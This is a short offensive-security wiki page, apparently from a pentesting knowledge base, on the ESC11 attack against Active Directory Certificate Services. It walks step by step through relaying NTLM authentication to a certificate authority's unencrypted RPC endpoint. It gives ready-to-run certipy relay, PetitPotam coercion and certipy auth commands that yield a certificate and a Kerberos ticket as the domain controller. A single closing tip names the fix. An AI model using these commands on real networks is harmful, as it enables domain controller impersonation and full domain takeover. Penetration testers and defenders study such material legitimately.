---
title: 'ESC11: ICPR NTLM Relaying'
description: 'ESC11: ICPR NTLM Relaying.'
---
# ESC11: ICPR NTLM Relaying

ESC11 is what happens when you combine the classic NTLM relay attack from ESC8 with the magical world of Remote Procedure Calls (RPC). 

While ESC8 relies on the CA having Web Enrollment (HTTP) enabled, ESC11 targets the native RPC endpoint (`ICPR`) used for standard certificate enrollment. If the CA doesn't enforce RPC sealing (encryption), an attacker can relay NTLM authentication to it and request a certificate.

## The Attack Path

If you can coerce a Domain Controller or a highly privileged user into authenticating to your attacker machine, you can relay that auth directly to the CA.

### 1. Set up the Relay
Use `ntlmrelayx` or `Certipy`, pointing it at the CA's RPC endpoint. 
```bash
certipy relay -target 'rpc://ca.domain.local' -template 'Machine'
```
*Wait patiently for the incoming connection.*

### 2. Coerce Authentication
Coerce the target (e.g., `DC01`) into authenticating to your attacking IP using something like PetitPotam.
```bash
python3 PetitPotam.py attacker_ip dc01.domain.local
```

### 3. Retrieve the Certificate
The relay tool catches the incoming authentication, forwards it to the CA over unsealed RPC, and requests a certificate using the `Machine` template. A base64 `.pfx` is printed to your screen.

### 4. Profit
Take your newly minted certificate and request a TGT as the Domain Controller.
```bash
certipy auth -pfx 'dc01.pfx' -dc-ip 192.168.100.1
```

!!! tip
    The fix for this is enforcing `IF_ENFORCEENCRYPTICERTREQUEST` on the CA, which makes it drop any RPC connection that isn't fully encrypted. Sorry, relayers!
